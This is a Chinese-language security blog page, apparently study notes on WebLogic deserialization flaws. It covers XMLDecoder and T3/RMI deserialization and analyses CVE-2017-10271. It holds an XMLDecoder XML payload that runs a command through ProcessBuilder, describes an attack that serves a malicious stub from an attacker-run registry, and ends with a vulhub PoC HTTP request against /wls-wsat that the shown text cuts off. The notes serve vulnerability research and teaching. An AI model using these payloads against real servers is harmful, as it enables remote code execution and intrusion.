<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" >WordPress Core 4.6 - Unauthenticated Remote Code Execution (RCE) PoC Exploit (exploitbox.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="Weblogic"   >
          <a href="#Weblogic" class="heading-link"><i class="fas fa-link"></i></a><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1>
      
        <h2 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2>
      
        <h3 id="XMLDecoder反序列化"   >
          <a href="#XMLDecoder反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#XMLDecoder反序列化" class="headerlink" title="XMLDecoder反序列化"></a>XMLDecoder反序列化</h3>
      <p>参考如下：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/321222.html" >https://www.freebuf.com/articles/web/321222.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>即<code>XMLDecoder</code>这个组件，可以将对象进行序列化生成特定格式文件<code>xx.xml</code>，然后通过反序列化该<code>xx.xml</code>可以得到对应的对象。</p>
<p>如上述链接提到的<code>Person</code>类</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//必须要有一个无参构造方法，要不会在序列化的过程中报错</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>其中的<code>get/set</code>方法在序列化时会调用到，反序列化时只会调用<code>set</code>方法，如果没有，相关的成员属性的值会丢失。</p>
<p>通过<code>XMLDecode</code>序列化生成如下格式文件</p>
<figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;11.0.9&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;Person&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">int</span>&gt;</span>18<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>之后进行反序列化即可得到对应的<code>Person</code>对象，相关代码如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.XMLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.beans.XMLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">decode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(test.class.getClassLoader().getResource(<span class="string">&quot;&quot;</span>).getPath() + <span class="string">&quot;config.xml&quot;</span>);</span><br><span class="line">        XMLDecoder xmlDecoder = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            xmlDecoder = <span class="keyword">new</span> XMLDecoder(<span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(file)));</span><br><span class="line">            <span class="comment">//反序列化对象</span></span><br><span class="line">            Object o = xmlDecoder.readObject();</span><br><span class="line">            <span class="keyword">return</span> o;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlDecoder != <span class="keyword">null</span>) &#123;</span><br><span class="line">                xmlDecoder.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">encode</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        XMLEncoder xmlEncoder = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File file = <span class="keyword">new</span> File(test.class.getClassLoader().getResource(<span class="string">&quot;&quot;</span>).getPath() + <span class="string">&quot;config.xml&quot;</span>);</span><br><span class="line">            xmlEncoder = <span class="keyword">new</span> XMLEncoder(<span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(file)));</span><br><span class="line">            <span class="comment">//序列化对象</span></span><br><span class="line">            xmlEncoder.writeObject(o);</span><br><span class="line">            xmlEncoder.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            xmlEncoder.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">&quot;test&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        encode(person);</span><br><span class="line">        Person result = (Person) decode();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">        <span class="comment">//decode();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>在反序列化的过程中，依据<code>xml</code>中文件内容，依据指定类进行反序列化，并且对应属性赋值。那么就可以找一个可以进行<code>RCE</code>的类，反序列化过程中就可以进行<code>RCE</code>了，相关<code>POC</code>如下</p>
<figure class="highlight xml"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--反序列化ProcessBuilder--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--传入参数--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--调用方法为start--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>这里<code>JAVA</code>版本写啥版本都没什么影响，这个<code>xml</code>进行反序列化之后相当于执行代码</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder proc = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">proc.start();</span><br></pre></td></tr></table></div></figure>

<p>导致任意代码执行，具体的<code>XMLDecode</code>里面怎么反序列化的，怎么调用的，函数调用链是什么样子的，还是看如下参考链接吧</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/321222.html" >https://www.freebuf.com/articles/web/321222.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/247331.html" >https://www.freebuf.com/articles/network/247331.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="T3反序列化"   >
          <a href="#T3反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#T3反序列化" class="headerlink" title="T3反序列化"></a>T3反序列化</h3>
      <p>参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10563#toc-3" >WeblogicT3反序列化浅析之cve-2015-4852 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/aevpg0#0af4c320" >Weblogic学习（一）： 初识T3反序列化 (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>其实主要就是<code>Weblogic</code>对于<code>T3</code>协议的处理，<code>T3</code>协议对于<code>Weblogica</code>而言，也就相当于<code>JRMP</code>协议对于原生的<code>Java</code>程序，都是用来<code>RMI</code>即远程方法调用的。</p>

        <h4 id="RMI-JRMP"   >
          <a href="#RMI-JRMP" class="heading-link"><i class="fas fa-link"></i></a><a href="#RMI-JRMP" class="headerlink" title="RMI/JRMP"></a>RMI/JRMP</h4>
      <p>关于<code>RMI</code>以及<code>JRMP</code>，感觉下面几篇文章挺好的</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7079" >基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7264#toc-0" >搞懂RMI、JRMP、JNDI-终结篇 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wx.zsxq.com/dweb2/index/topic_detail/844112455528482" >P神的三篇RMI机制分析</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>就个人理解而言，画个图好解释一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208124253918.png" alt="image-20230208124253918"></p>
<p>代码参照的是：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7079" >基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<ul>
<li><p><code>Server</code>相关类实现如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">  <span class="function">String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//重写了sayHello</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="title">HelloServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>Client</code>相关类实现如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function">String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//并没有实现sayHello</span></span><br></pre></td></tr></table></div></figure></li>
</ul>
<p>总结来说，就是<code>Server</code>和<code>Client</code>共用一个接口，<code>Client</code>调用<code>Server</code>重写的接口。</p>
<p>首先<code>Server</code>重写该接口生成对象，将重写之后的对象进行动态代理序列化后上传到注册中心作为存根<code>stub</code>。然后<code>Client</code>就可以从注册中心<code>register</code>下载<code>Server</code>重写该接口的动态代理对象存根<code>stub</code>，将之反序列化后进行动态代理即可调用到<code>Server</code>重写的接口函数了。</p>
<p>这里提到<code>stub</code>对象不是对应的<code>HelloServiceImpl</code>对象，而是<code>JAVA</code>动态代理对象，里面存储了如何跟服务端联系的信息，以及封装了RMI的通讯实现细节，也就是对于<code>sayHello</code>重写的代码并没有保存在这个<code>stub</code>对象中，还是保存在服务器上，调用的时候还是远程调用。</p>
<p>还有更加详细的关于动态代理对象的解释可以看看奇安信<code>A-team</code>的师傅写的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704" >WebLogic安全研究报告 (qq.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，感觉写的很好，如下图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208124814148.png" alt="image-20230208124814148"></p>
<p>需要注意的是，服务端<code>Server</code>和注册中心<code>register</code>其实是可以放在一台机器上的。</p>
<p>感觉这个过程更像是一个<code>RSA</code>过程，服务器生成私钥(<code>stub</code>)给客户，公开公钥(<code>register</code>以及<code>Skeleton</code>)，借助这两方完成通信。</p>

        <h5 id="序列化漏洞"   >
          <a href="#序列化漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#序列化漏洞" class="headerlink" title="序列化漏洞"></a>序列化漏洞</h5>
      <p>在这个过程中进行通信所用到的协议就是<code>JRMP</code>协议，其中进行数据传输的过程中，无论是客户端还是服务端，都会用到<code>JAVA</code>反序列化和序列化，<strong>盗用一下奇安信师傅的图，2333</strong></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208121353125.png" alt="image-20230208121353125"></p>
<p>也就是基本都会存在漏洞，但是爆出来洞之后基本也会有相关的黑名单限制。可以参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/escape-w/p/16107675.html" >从ysoserial讲RMI/JRMP反序列化漏洞 - Escape-w - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="T3协议"   >
          <a href="#T3协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h4>
      <p>对于<code>T3</code>也是类似的，<strong>盗用一下奇安信师傅的图，2333</strong></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208114134211.png" alt="image-20230208114134211"></p>

        <h5 id="漏洞原理-1"   >
          <a href="#漏洞原理-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5>
      <p>而对于使用<code>T3</code>协议，其数据包结构</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208122112606.png" alt="image-20230208122112606"></p>
<p>替换之后，当服务器接收到恶意的数据，对其中的一些序列化数据进行反序列化是，就会导致恶意对象被反序列化，从而引发反序列化漏洞。</p>

        <h5 id="攻击方式"   >
          <a href="#攻击方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h5>
      <p>相关的攻击方式就比如说在自己服务器生成一个注册中心，可控受害者的反序列化时就可以让其使用<code>RMI</code>机制。从自己服务器获取恶意的<code>stub</code>对象，然后在受害者再对该<code>stub</code>进行反序列化时即可完成攻击。</p>
<p>（因为可控受害者的反序列化的过程中可能会碰到黑名单限制，无法轻松完成<code>CC</code>链之类的攻击，所以借助原生<code>RMI</code>机制，详见<code>CVE-2015-4852</code>之后关于<code>T3</code>的漏洞。另外借助原生的<code>RMI</code>机制其实也可能会有黑名单限制，这个就需要自己绕过，或者找现成的<code>payload</code>来打了，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/228918%EF%BC%89" >https://www.anquanke.com/post/id/228918）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="CVE-2017-10271"   >
          <a href="#CVE-2017-10271" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h2>
      <p>Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞</p>

        <h3 id="环境搭建"   >
          <a href="#环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10172#toc-1" >https://xz.aliyun.com/t/10172#toc-1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>记得最后把<code>docker</code>重启一下就行</p>

        <h3 id="漏洞分析"   >
          <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
      <p>漏洞点在<code>/wls-wsat/</code>提供的页面上，当<code>POST</code>请求规范的<code>XML</code>数据访问该组件下对应的页面，会进入到<code>weblogic/wsee/jaxws/workcontext/WorkContextServerTube</code>类中的<code>processRequest</code>方法，进行数据包的处理。</p>
<p>相关分析流程可以参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/102768#h2-6" >https://www.anquanke.com/post/id/102768#h2-6</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10172#toc-4" >https://xz.aliyun.com/t/10172#toc-4</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>对应调用链条为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WorkContextServerTube.processRequest   		</span><br><span class="line">WorkContextServerTube.readHeaderOld			//这里进行数据提取分割</span><br><span class="line">WorkContextTube.WorkContextXmlInputAdapter  //这里创建XMLDecoder对象</span><br><span class="line">WorkContextServerTube.receive</span><br><span class="line">WorkContextMapImpl.receiveRequest</span><br><span class="line">WorkContextLocalMap.receiveRequest</span><br><span class="line">WorkContextEntryImpl.readEntry</span><br><span class="line">WorkContextXmlInputAdapter.readUTF</span><br></pre></td></tr></table></div></figure>

<p>最终在<code>readUTF</code>中进行反序列化，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206192739611.png" alt="image-20230206192739611"></p>
<p>这里的<code>xmlDecode</code>里面保存的<code>buf</code>就是我们传入去掉头部留下的数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206194257790.png" alt="image-20230206194257790"></p>
<p>赋值过来，用<code>python</code>跑一下就知道</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206194334454.png" alt="image-20230206194334454"></p>
<p>这样即得到最终的命令执行。</p>

        <h3 id="POC"   >
          <a href="#POC" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC" class="headerlink" title="POC"></a>POC</h3>
      <p>在<code>P神</code>的<code>vulhub</code>下复制来的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.163.130:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 641</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext 